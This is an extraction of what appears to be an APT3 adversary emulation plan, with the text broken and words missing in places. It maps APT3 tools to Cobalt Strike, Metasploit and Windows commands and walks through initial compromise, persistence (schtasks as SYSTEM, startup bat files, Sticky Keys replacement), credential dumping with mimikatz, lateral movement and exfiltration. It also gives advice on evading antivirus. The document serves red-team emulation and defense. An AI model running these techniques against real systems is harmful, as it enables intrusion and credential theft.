\nInterface\n \nTelnet\n \npkgmgr \n\n\n*\n \nshell \npkgmgr \n\n\n \nrun metsvc\n \nT1050 \n\n \nNew \nService, T1108 \nRedundant \nAccess\n \nSQL\n \nO\nsql\n**\n \nshell osql\n \nauxiliary/admin/mssql/m\nssql_sql\n \nN/A\n \nKeylog\n \nN/A\n \nkeylogger [pid] \n[x86|x64]\n \nKeyscan_start, \nkeyscan_dump\n \nT1056 \n\n \nInput \nCapture\n \n*Note: pkgmgr has been archived and may not be on newer Windows systems.\n \n**Note: osql is usually found on Windows Server systems and will be replaced with sqlcmd \ninstead.\n \n \n2.2.3\n \nOSInfo\n \nFunctions\n \nTable \n4\n \nOSInfo Fu\nnctionality and Emulation\n \nOSInfo \nFunction\n \nWindows \nBuilt\n-\nin\n \nCobalt \nStrike/Beacon\n \nMetasploit/Meterpreter\n \nATT&CK \nTechnique\n \nDomain\n \nIpconfig, \nwhoami, \nnet config \nworkstation\n \nShell ipconfig\n \nipconfig\n \nT1016 \n-\n \nSystem \nNetwork \nConfiguration \nDiscovery\n \n \nOsinfo\n \nsysteminfo, \nver, set\n \nsystemprofiler\n \nSysinfo, get_env.rb, run \nwinenum\n \nT1082 \n-\n \nSystem \nInformation \nDiscovery\n \nTsinfo\n \nReg query\n \nShell reg \nquery\n \nReg (built into meterpreter, \nnot windows reg)\n \nT1012 \n-\n \nQuery \nRegistry\n \nNetuseinfo\n \nnet use \n \nShell net use\n \nEnum_shares.rb\n \nT1049 \n-\n \nSystem \nNetwork \nConnections \nDiscovery\n \n  \n \n2\n-\n8\n \nShareInfo\n \nnet share, \nnet view\n \nShell net share\n \nEnum_shares.rb, \nauxiliary/scanner/smb/ \nsmb_enumshares\n \nT1135 \n-\n \nNetwork \nShare Discovery\n \nConnect Test\n \nping\n \nShell ping\n \nNetenum.rb\n \nT1018 \n-\n \nRemote \nSystem \nDiscovery\n \nLocal Group \nUser Info\n \nnet user, \nnet \nlocalgroup\n \nNet \nlocalgroup, \nshell net user\n \nPost/windows/gather/ \nenum_domain_tokens, \nauxiliary/scanner/sm\nb/ \nsmb_enumusers\n \nT1087 \n-\n \nAccount \nDiscovery\n, \nT1069 \n-\n \nPermission \nGroups \nDiscovery\n \nGlobal Group \nUser Info\n \nnet user, \nnet group\n \nNet \ngroup, \nshell net user\n \nDomain_list_gen.rb, \npost/windows/gather \nenum_domain_group_users, \nauxiliary/scanner/smb/ \nsmb_enumusers\n \nT1087 \n-\n \nAccount \nDiscovery\n, \nT1069 \n-\n \nPermission \nGroups \nDiscovery\n \nGroup \nAdministrators\n \nnet \nlocalgroup, \nnet group\n \nNet \nlocalgroup, net \ngroup\n \nDomain_list_gen.rb, \npost/windows/gather \nenum_domain_group_users, \nauxiliary/scanner/smb/ \nsmb_enumusers\n \nT1087 \n-\n \nAccount \nDiscovery\n, \nT1069 \n-\n \nPermission \nGroups \nDiscovery\n \nGroup Power \nUsers\n \nnet \nlocalgroup, \nnet group\n \nNet \nlocalgroup, net \ngroup\n \nDomain_list_gen.rb, \npost/windows/gather \nenum_domain_group_users, \nauxiliary/scanner/smb/ \nsmb_enumusers\n \nT1087 \n-\n \nAccount \nDiscovery\n, \nT1069 \n-\n \nPermission \nGroups \nDiscovery\n \nGroup \nDomain \nAdmins\n \nnet \nlocalgroup, \nnet group\n \nNet \nlocalgroup, net \ngroup\n \nDomain_list_gen.rb, \npost/windows/gather \nenum_domain_group_users, \nauxiliary/scanner/smb/ \nsmb_enumusers\n \nT1087 \n-\n \nAccount \nDiscovery\n, \nT1069 \n-\n \nPermission \nGroups \nDiscovery\n \n \n \n \n \n  \n \n2\n-\n9\n \n2.2.4\n \nPwdump Functions\n \nTable \n5\n \nPwdump Functions and Emulation\n \npwdump \nFunction\n \nCobalt Strike/Beacon\n \nMetasploit/M\neterp\nreter\n \nATT&CK Technique\n \nDump creds \nfrom SAM\n \nMimikatz !lsadump:sam\n \nRun hashdump, \nhashdump\n \nT1003 \n-\n \nCredential \nDumping\n \nInject into \nLSASS\n \nLogonpasswords, \nhashdump, mimikatz\n \n\n \nT1003 \n-\nCredential \nDumping\n \n2.2.5\n \nMimikatz Functions\n \nTable \n6\n \nMimikatz Functions and Emulation\n \nMimikatz \nFunction\n \nCobalt Strike/Beacon\n \nMetasploit/Meterpreter\n \nATT&CK Technique\n \nDump creds \nfrom SAM\n \nMimikatz !lsadump:sam\n \nRun hashdump, \nhashdump\n \nT1003 \n-\n \nCredential \nDumping\n \nInject into \nLSASS\n \nLogonpasswords, \nhashdump, mimikatz\n \n\n \nT1003 \n-\nCredential \nDumping\n \n2.2.6\n \nRemoteCMD Functions\n \nTable \n7\n \nRemoteCMD Functions and Emulation\n \nRemoteCMD \nFunction\n \nWindows Built\n-\nin\n \nOther Tools\n \nATT&CK Technique\n \nSMB\n \nCopy\n \nn\net use,\n \ncopy, xcopy, \nexplorer.exe\n \nPsExec\n \nT1105 \n-\n \nRemote File Copy\n \nRemote Service\n \ns\nc\n \nPsExec\n \nT1021 \n-\n \nRemote Services\n \nRemote Schtasks\n \ns\nchtasks, at\n \n \nT1053 \n-\n \nScheduled Task\n \n2.2.7\n \nDsquery Functions\n \nTable \n8\n \nDsquery Function and Emulation\n \nDsquery \nFunction\n \nCobalt \nStrike/Beacon\n \nMetasploit/Meterpreter\n \nATT&CK \nTechnique\n \nAccount and \nP\nermission \nGroups \nDiscovery\n \nshell \nDsquery*\n \nshell / dsquery\n \nT1087 \n\n \nAccount \nDiscovery\n, \nT1069 \n\n \nPermission \nGroups \nDiscovery\n \n* Note : Dsquery is found on Windows Server systems and may not be on all machines by \ndefault.\n \n  \n \n3\n-\n10\n \n2.2.8\n \nLaZagne Functions\n \nTable \n9\n \nLaZagne Functions and Emulation\n \nLaZagne Function\n \nCobalt \nStrike/Beacon\n \nMetasploit/Meterpreter\n \nATT&CK \nTechnique\n \nGather credentials \nfrom browsers, IM \nsoftware, \ndatabases, memory, \nand other software\n \n \nPost/windows/gather/credentials/ \ncredential_collector,\n \nPost/multi/gather/firefox_creds\n \nT1081 \n-\n \nCredentials \nin Files\n, \nT1003 \n\n \nCredential \nDumping\n \n \n2.2.9\n \nScanBox Functions\n \nTable \n10\n \nScanBox Functions and Emulation\n \nScanBox Function\n \nFunction Notes\n \nEmulation Notes\n \nExploitKit\n-\nstyle recon \nand profiling\n \n \nSoftware, browser plugins,\n \nflash, \nSharePoint, Adobe PDF reader, \nChrome security plugins, Java, \nInternal IP address\n \nN/A since this is used before \ninitial compromise.\n \nKeylogger\n \nWritten in JavaScript, only logs \n\ntyped while on the page \nthat loads the keylogger JS.\n \nN/A since this is used before \ninitial compromise.\n \n \n \nEmulation Phases\n \nAPT3 disseminates spam\n-\nlike phishing campaigns with vari\nous payload delivery methods \n[1]\n. \nOnce on a machine, the actors collect information about the victim such as connected users \n[14]\n \nand analyze it for its value, trying to determine where they landed and what access they have.  \nAdmin access is an obvious m\nain target due to the increased access it will likely provide\n. The \nactors then drop multiple backdoors, usually 2\n-\n4 on the initial system and 5+ versions within the \nfirst few hops, with independent C2 profiles for redundancy [\nRedundant Access \n\n \nT1108\n]\n. Next \nthey\n \nthen dump as many credentials as possible, and quickly continue spreading throughout the \nnetwork. They specifically go after file \nservers and print servers \n[1]\n \n[3]\n\nall the machines they think have value, they collect all the documents they want, package them \nup and password protect them, and exfiltrate them out of the o\nrganization \n[15]\n. In \nsome\n \ncases, \n\nhout ever \nexfiltrating data.\n \nThe sections below show how APT3 acts through their entire lifecycle. Phase 1 documents wh\nat \nhappens during initial compromise, phase 2 highlights techniques used during network \npropagation, and phase 3 documents one way they have been known to perform exfiltration.\n \n \n  \n \n3\n-\n11\n \n3.1\n \nPhase 1\n \n\n \nInitial Compromise\n \nThe goal of the Initial Compromise phase is to ac\nhieve successful code execution and control of \na system \nwithin the target environment. \n \nAPT3 primarily conducts initial compromise using spear phishing, delivering implants through \nboth malicious attachments and malicious links. They have used new  0\n-\ndays \non multiple \nbrowsers \n[15]\n. They have targeted existing 0\n-\ndays in Internet Explorer\n \n[2]\n, Windows \n[2]\n, and \nFlash \n[14]\n. They have also been known to compromise weakly secured legitimate websites to \nwhich users are directed through spear phishing emails \n[16]\n.\n \n \n3.1.1\n \nImplant Command and Control\n \nAPT3 implants issue command and control (C2) \ntraffic as HTTP GET requests that beacon at set \ninterval\ns \n[14]\n. The HTTP Cookie field contains information for the C2 server, which responds \nwith a webpage that contains the command encoded\n \nwithin a specific HTML tag \n[15]\n. APT3 \nimplants have also been known to\n \nuse custom binary protocols \n[2]\n. Pirpi.2014 and Pirpi.2015 \nboth contain several kinds of sleep and anti\n-\nsandbox strategies that cause th\ne RAT to pause \nbetween executions\n \n[15]\n. Some of the Pirpi instances have been known to also use SSL for their \ncommunications and even include public/priva\nte keys within the binaries \n[1\n7]\n. This level of C2 \n\naccompanying Malleable C2 profile modeled on \n[14]\n.\n \n3.1.2\n \nDefense Evasion\n \n\ntomized or modified to prevent detection. \n\n \nanti\n-\ndisassembly techniques \n[3]\n, including \nrequiring certain command li\nne parameters to run \n[17]\n. \nThese are defense evasion techniques that \nAPT3 sets up before getting initial acc\ness to the target environment. \n \nIt is recommended to use anti\n-\nantivirus (AV)\n \ncapabilities \nto prevent AV detection of commonly \navailable tools. If Sandboxing is a problem, poss\nibly encrypt tools to bypass sandboxing. An \nexample of this would be Veil\n-\nE\nvasion \n[18]\n \nor Artifact Kit\n \n[19]\n. ATTACK techniques: \nT1027 \n\n \nObfuscated Files or Information\n,\n \nT1045 \n\n \nSoftware Packing\n, \nT1066 \n\n \nIndicator Removal from \nTools.\n \n3.1.3\n \nInitial Access\n \nFor Initial \nCompromise, both web server drive\n-\n\ntradecraft. The Social Engineering Toolkit (free) \n[20]\n \nand Cobalt Strike (paid) \n[6]\n \nhave features \nthat support th\nese methods. \n \n3.1.3.1\n \nCase 1 \n\n \nSpear Phishing with Browser Exploit \n[2]\n \nIn late November 2014 an APT3 campaign used a spear phishing email (see Appendix A) \ncontaining a link to a malicious site. The site contained JavaScript that tr\niggered \nCVE\n-\n2014\n-\n6332\n \n(an Internet Explorer exploit\n \n[21]\n) which launched a VBscript and PowerShell based payload. \n\n  \n \n3\n-\n12\n \n\n\n \nCVE\n-\n2014\n-\n4113 (a Windows Kernel exploit \n[22]\n) \n\n \ncmd.exe /C whoami\n \nschtasks /create /tn \"mysc\" /tr C:\n\\\nU\nsers\n\\\nPublic\n\\\ntest.exe /sc ONLOGON /ru \"System\" \n \nThe first command is used to check that the process is running as SYSTEM. The second \nestablishes \npersistence via \nS\nchtasks.\n \nIn addition, the implant connected to a command and control \nserver \nover \nport 1913 \nusing the \nSOCKS5\n \nprotocol\n. This dropper supports writing to or executing files at the following locations:\n \nC:\n\\\nUsers\n\\\n[Username]\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nnotepad1.exe\n \nC:\n\\\nUsers\n\\\n[Username]\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nnotepad.exe\n \nC:\n\\\nUsers\n\\\n[Username]\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nnotepad\n2.exe\n \nC:\n\\\nUsers\n\\\n[Username]\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nnewnotepad.exe\n \nIn addition, the software supports exfiltrating the file written at the following location [\nT1074 \n\n \nData Staged\n]:\n \nC:\n\\\nUsers\n\\\n[Username]\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nnote.txt\n \n\n \n3.1.3.2\n \nSpear Phishing with Malicious RAR Attachment \n[3]\n \nIn attacks dating late 2015 to early 2016 APT3 has been known to \nuse a zip archive containing a \nWindows shortcut file with an Internet Explorer logo. Clicking on this link led to a download of \n\n \n3.1.3.3\n \nSpear Phishing with Malicious RAR Attachment \n[7]\n \nIn attacks report\ned in June 2014, APT3 actors sent a RAR archive as an email attachment. It \ncontained a resume and program purported to be written by \nthe job candidate. The\n \nprogram, \nttcalc.exe, contained a legitimate version of TTCalc but also dropped Pirpi to:\n \n%USERPROFIL\nE%/Application Data/mt.dat\n \nAnd a bat file that was saved at [\nT1064 \n\n  \nScripting\n]:\n \n%USERPROFILE%/Start Menu/Programs/Startup/vc.bat\n \nThe bat file contained the following script:\n \n@echo off\n \ncmd.exe /C start rundll32.exe \"C:\n\\\nDocuments and Settings\n\\\nadmin\n\\\nApplication \nData\n\\\nmt.dat\" UpdvaMt\n \nThe bat file will be triggered when the user logged in and would have caused Pirpi to start with \nrundll32 [\nT1085 \n\n \nRundll32\n].\n \n  \n \n3\n-\n13\n \n3.1.3.4\n \nSpear Phishing with Malicious RAR Attachment \n[7]\n \nReported in June 2014, APT3 actors sent an encrypted self\n-\nextracting RAR attachment. The \nRAR contained a trojanized setup program which\n \nattempts to drop and run ttcalcBAK.exe \nanother self\n-\nextracting RAR which drops a DLL version of the PlugX RAT at:\n \n%ALLUSERSPROFILE%\n\\\nchrome_frame_helper\n \nThe RAT is loaded via DLL side\n-\nloading with a valid version of Chrome [\nT1073 \n\n \nDLL Side\n-\nLoading\n]. \n \n3.1.3.5\n \nFlash Exploit with Malware Concealed Within GIF \n[14]\n \nReported in 2015, two different APT3 campaigns targeted Flash exploits, \nCVE\n-\n2014\n-\n1776\n \nand \nCVE\n-\n2015\n-\n3113\n. In bot\nh cases the Flash exploit loaded the payload (the Pirpi RAT) from\n \nspecially crafted GIF images. \n \n3.1.3.6\n \nVictim Profiling \n[16]\n \nReported in July 2015, APT3 used spear phising to direct targets to a compromised site. This site \nhad \nScanBox installed which was used to profile the victims and in some cases, deliver exploits \nto selected victims.\n \n3.2\n \nPhase 2 \n-\n \nNetwork Propagation\n \nThe goal of the Network Propagation phase is to identify and move to desired systems within the \ntarget environmen\nt with the intention of discovering credentials and documents for exfiltration.\n \nPublicly\n \n\n-\nexistent. One report that discusses general characteristics of APT3 is \n[23]\n, but it is uncertain \nwhat data sources were used to compile the listed TTPs. Aside from that report we draw \nconclusions of how APT3 operates \nbased\n \non\n \nthe capabilities of Pirpi and other tools that they \nare reported to use. There are \nsome persistence techniques that they have used during Initial \nCompromise that can be applied to Network Propagation. Despite this, there are significant \n\nguesse\ns or recommendations.\n \n \nThe process within this phase can be described with the below diagram. Each step within this \nphase is broken out by ATT&CK tactic and the corresponding APT3 specific techniques \ndocumented in reports. A command\n-\nline reference for emul\nating the specific ATT&CK \ntechniques with built\n-\nin Windows utilities, Cobalt Strike, and Metasploit can be found in the \n\nAPT3 Adversary Emulation Field Manual\n\n \n \n \n \n  \n \n3\n-\n14\n \n3.2.1\n \nHost\n \nOperations\n \n3.2.1.1\n \nDiscovery\n \nAPT3 can perform discovery with its OSInfo tool and by running built\n-\nin Windows utilities on \nthe command\n-\n\nlot of time spent enumerating domain groups with elevated p\n\n\nT1069 \n-\n \nPermission Groups Discovery\n\na heavy emphasis on enumerating users in these special groups with the\n \n\n[\nT1087 \n\n \nAccount Discovery\n].\n \nFigure \n2\n \nAPT3 Phase 2 Flow Chart\n \n  \n \n3\n-\n15\n \n \nWhen doing discovery, certain actions are very closely intertwined \n(as \nshown grouped together in the above diagram). Querying the \n\nT1069 \n\n \nPermission \nGroups Discovery\n] returns the users that are members of that \ngroup, which then\n \n\npart of any other interesting groups [\nT1087 \n\n \nAccount Discovery\n]. \nThis process can repeat for a while as all interesting users and \ngroups are \ne\nnumerated. \nSimilarly, querying systems for their \nconfiguration \n[T1016 \n\n \nSystem Network Configuration Discovery\n]\n \nand their current network connections [\nT1049 \n\n \nSystem Network \nConnections Discovery\n] are heavily integrated.\n \n \n \n \n \n \n3.2.1.2\n \nLocal Privilege Escalation\n \nCredential dumping and persistence may require \nlocal \nprivilege escalation\n \nif the attacker does \nnot have control of a high integrity process;\n \nhowever, the \nonly\n \nreporting\n \navailable on \nlocal p\nrivilege \ne\nscalation \nmethods \nu\nsed by APT3 is CVE\n-\n2014\n-\n4113 \n[2]\n. \nIt is \npossible that their strong reliance on credential access \n(detailed later) allows them to use credentials with \nincreasing levels of access in place of other \nlocal \nprivilege escalation mechanisms. Their perceived focus \nduring this phase, however, is on\n \nfinding credentials that \nallow direct admin permissions.\n \nIn this case, control falls \nthrough to cr\nedential access or persistence.\n \nD\nuring an engagement\n,\n \nadversary emulators\n \nmay find it \nnecessary to perform local privilege escalation\n \ndue to \ntime constraints\n. \nM\nost common frameworks (including Metasploit and Cobalt Strike) contain \nsome methods for privilege \nescalation. Also, \nUACBypass \n[24]\n \nand PowerUp\n \n[9]\n \nare common and \nfreely available tools \nthat may be used to perform Privilege Escalation.\n \nFigure \n3\n \nAPT3 Discovery \nATT&CK Techniques\n \nFigure \n4\n \nAPT3 Privilege Escalation \nATT&CK Techniques\n \n  \n \n3\n-\n16\n \n3.2.1.3\n \nPersistence\n \nAPT3 has used multiple methods for persistence: creating a \nservice \n[23]\n \n(\nT1050 \n-\n \nNew Service\n), creating a scheduled task \n[2]\n \n(T1053 \n-\n \nScheduled Task), and also by placing scripts in the \nStartup Folder \n[7]\n \n[\nT10\n60 \n-\n \nRegistry Run Keys/Start Folder\n]. \n \nAPT3 has replaced the Sticky Keys binary \n(\nC:\n\\\nWindows\n\\\nSystem32\n\\\nsethc.exe\n) with cmd.exe \n[\nT1015 \n-\n \nAccessibility Features\n]\n \nand enabled Remote Desktop Protocol \n(RDP) if it is not already enabled [\nT1076 \n\n \nRemote Desktop \nProtocol\n]. \nThis specific \nP\nersistence technique has an added \nbenefit of allowing an operator to open a command prompt \nwhen connected ove\nr RDP without having to provide valid \ncredentials\n \n[23]\n.\n \nAPT3 has been known to create or enable accounts, for \n\nand add \nthem \nto \nthe local admin \ngroup\n \n[23]\n \n[\nT1136 \n\n \nCreate Account\n]. Presumably this is done \nfor easier future access.\n \nRecommendation: On new hosts, establish \np\nersistence by \ncreating a \nservice\n \nor schta\nsk\ns\n. \nOn systems where RDP capabilities are desired, \nit might also be useful to enable \ns\nticky \nk\neys and RDP\n.\n \n3.2.1.4\n \nCredential Access\n \nAPT3 uses many forms of c\nredential access. They used \ncustomized versions of pwdump, and later a custom \ncompiled version of mimikatz, to search for cached \nWindows credentials [\nT1003 \n-\n \nCredential Dumping\n] as well \nas Chrom\nePass and Lazagne [\n(\nT1081 \n-\n \nCredentials in \nFiles\n], to search though browser and other credential \ncaches. Their pwdump tool injects itself into lsass.exe and \nis executed by running the GetHas\nh ex\nport of the \nlsremora.dll \n[3]\n \nMimikatz is used to dump plaintext \ncredentials by injecting into lsass.exe. [\nT1003 \n-\n \nCredential \nDumping\n]. \n \nThey also install a \nkeylogger, which can be used to \ndiscover credentials and remote systems [\nT1056 \n-\n \nInput \nCapture\n]. This keylogger installs itself as a service and \nrecords keystrokes in encrypted files such as \nthu\nmbcache_96.dbx [\nT1027 \n\n \nObfuscated Files or \nInformation\n] \n[3]\n.\n \n \nFigure \n5\n \nAPT3 \nPersistence ATT&CK \nTechniques\n \nFigure \n6\n \nAPT3 Credential Access \nATT&CK Techniques\n \n  \n \n3\n-\n17\n \n3.2.2\n \nLateral Movement\n \nThough publicly reported information on how APT3 \nenumerates machines aside from related commands in \n\n\n \n\ndsquery to do so. \nThis may be due to a\n \nlack of available \ninformation on how APT3 opera\ntes during an operation \nsince most reports tend to be focused on forensic \ninformation. Pirpi has commands that list servers in the \ndomain, list TCP connections and retrieve connected users \n(T1049 \n-\n \nNetwork Connections Discovery), and list Domain \nController\ns (T1018 \n-\n \nRemote System Discovery). Some of \nthis information may be used to identify target hosts for \nlateral movement. In addition to built\n-\nin Windows utilities, \nthere are some open source tools which collect similar \ninformation. APT3 will quickly spread\n \nto other machines as \nfast as possible, often checking for easy password reuse by \n\n[\nT1078 \n\n \nValid Accounts\n] [\nT1077 \n-\n \nWindows Admin \nShares\n] [\nT1110 \n\n \nBrute Force\n]. \n \nAPT3 prioritizes file and printer servers. \n \nRemote Copy and Execution \n \nAPT3 uses a custom tool called RemoteCMD that can run \n\nprotocol(s) are being used, but RemoteCMD supports file \noperations (upload, download, delete and rename) service \noperations (creation, deletion, start an\nd stop) and \nscheduled \ntasks (\nAT\n,\nschtasks). Presumably these are done over SMB (files), Remote Service (services) and \nRemote Schtasks (AT). \n \n3.3\n \nPhase 3 \n-\n \nExfiltration\n \n\nT3 will compromise a \nnetwork to a certain degree of satisfaction \nbefore starting to exfil, due to stealth \nconcerns. Depending on the defensive setup, \nexfiltration could be much noisier and \nnoticeable than attempting to hide in the \nnoise with lay\n-\nof\n-\nthe\n-\nlan\nd tools.\n \n \nThe only source we were able to find for \nAPT3 exfiltration methods is from 2012. For \nexfiltration, they will identify Office \ndocuments on the computer \n[23]\n \n[\nT1005 \n-\n \nData from Local System\n]. \nThey \nthen\n \ndrop the \ncommand\n-\nline Chinese language version of \nWinRAR and use it to compress and encrypt the discovered documents\n \n[\nT1002 \n-\n \nData \nFigure \n7\n \nAPT3 Lateral Movement \nand Execution ATT&C\nK Techniques\n \nFigure \n8\n \nAPT3 Exfiltration ATT&CK Techniques\n \n  \n \n3\n-\n18\n \nCompressed\n]. This\n \narchive will then be stored in the recycle bin \n[23]\n, \nusually on a machine \ndesignated as a staging server, which they move the exfiltration through\n \n[\nT1074 \n-\n \nData St\naged\n]. \nData is exfiltrated \nover port 443 \nwhich is typically HTTPS traffic, however th\ney have used SSL \nencryption \n[17]\n \nand normal HTTP \n[23]\n \n[\nT1043 \n-\n \nCommonly Used Port\n] .\n \n \n  \n \n \nBibliography\n \n \n[1] \n \n[Online]. Available: https://www.fireeye.com/blog/threat\n-\nresearch/2015/06/opera\ntion\n-\nclandestine\n-\nwolf\n-\nadobe\n-\nflash\n-\nzero\n-\nday.html.\n \n[2] \n \n[Online]. Available: https://www.fireeye.com/blog/threat\n-\nresearch/2014/11/operation_doubletap.html.\n \n[3] \n \n[Online]. Available: \nhttps://www.symantec.com/connect/blogs/buckeye\n-\ncyberespionage\n-\ngroup\n-\nshifts\n-\ngaze\n-\nus\n-\nhong\n-\nkong.\n \n[4] \n \n[Online]. Available: https://threatpost.com/emergency\n-\nadobe\n-\nflash\n-\npatch\n-\nfixes\n-\nzero\n-\nday\n-\nunder\n-\nattack/113434/.\n \n[5] \n \n[Online]. Available: \nhttps://www.metasploit.com/.\n \n[6] \n \n[Online]. Available: https://www.cobaltstrike.com/.\n \n[7] \n \n[Online]. Available: https://www.fireeye.com/blog/threat\n-\nresearch/2014/06/clandestine\n-\nfox\n-\npart\n-\ndeux.html.\n \n[8] \n \n[Online]. Available: https://www.lastline.com/labsb\nlog/an\n-\nanalysis\n-\nof\n-\nplugx\n-\nmalware/.\n \n[9] \n \n[Online]. Available: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon.\n \n[10] \n \n[Online]. Available: https://github.com/gentilkiwi/mimikatz.\n \n[11] \n \n[Online]. Available: \nhttps://technet.microsoft.com/en\n-\nus/sysinternals/bb897553.aspx.\n \n[12] \n \n[Online]. Available: http://www.nirsoft.net/utils/chromepass.html.\n \n[13] \n \n[Online]. Available: https://github.com/AlessandroZ/LaZagne.\n \n[14] \n \n[Online]. Available: http://researchcenter.\npaloaltonetworks.com/2015/07/ups\n-\nobservations\n-\non\n-\ncve\n-\n2015\n-\n3113\n-\nprior\n-\nzero\n-\ndays\n-\nand\n-\nthe\n-\npirpi\n-\npayload/.\n \n[15] \n \n[Online]. Available: https://www.fireeye.com/blog/threat\n-\nresearch/2014/04/new\n-\nzero\n-\nday\n-\nexploit\n-\ntargeting\n-\ninternet\n-\nexplorer\n-\nversions\n-\n9\n-\nthrough\n-\n11\n-\ni\ndentified\n-\nin\n-\ntargeted\n-\nattacks.html.\n \n[16] \n \n[Online]. Available: http://pwc.blogs.com/cyber_security_updates/2015/07/pirpi\n-\nscanbox.html.\n \n[17] \n \n[Online]. Available: https://recon.cx/2017/montreal/resources/slides/RECON\n-\nMTL\n-\n2017\n-\nevolution_of_pirpi.pdf.\n \n[18]\n \n \n[Online]. Available: https://github.com/Veil\n-\nFramework.\n \n[19] \n \n[Online]. Available: https://www.cobaltstrike.com/help\n-\nartifact\n-\nkit.\n \n[20] \n \n[Online]. Available: https://github.com/trustedsec/social\n-\nengineer\n-\ntoolkit/.\n \n[21] \n \n[Online]. Available: \nhttps://cve.mitre.org/cgi\n-\nbin/cvename.cgi?name=CVE\n-\n2014\n-\n6332.\n \n[22] \n \n[Online]. Available: https://cve.mitre.org/cgi\n-\nbin/cvename.cgi?name=CVE\n-\n2014\n-\n4113.\n \n[23] \n \n[Online]. Available: http://carnal0wnage.attackresearch.com/2012/09/more\n-\non\n-\naptsim.html.\n \n[24] \n \n[\nOnline]. Available: https://github.com/hfiref0x/UACME.\n \n \n \n \n \n  \n \n \n \n \n \n \n \n \n \nThis\n \npage intentionally left blank\n \n "]